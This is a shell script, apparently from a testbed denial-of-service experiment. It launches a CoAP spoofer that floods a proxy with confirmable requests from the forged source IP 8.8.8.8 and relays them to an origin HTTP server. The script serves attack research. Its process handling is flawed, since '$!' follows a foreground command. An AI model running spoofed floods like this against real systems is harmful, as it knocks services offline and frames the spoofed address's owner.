
. /proj/MIT-DoS/exp/coap-setup/deps/californium/deter/scripts/config.sh

rm -f $TMP_DATA/$ATTACKER_LOGNAME
touch $TMP_DATA/$ATTACKER_LOGNAME

my_ip="8.8.8.8"

python3 $DETER_HOME/coapspoofer.py \
  --debug \
  --source $my_ip \
  --src-port 7123 \
  --destination $PROXY_IP \
  --dst-port 5683 \
  --message-type CON \
  --code 001 \
  --uri-host $PROXY_IP \
  --uri-path coap2http \
  --proxy-uri http://$ORIGIN_SERVER_IP:8000 \
  --flood True > $TMP_DATA/$ATTACKER_LOGNAME

spoofer_pid=$!

sleep $ATTACKER_DURATION

kill $spoofer_pid
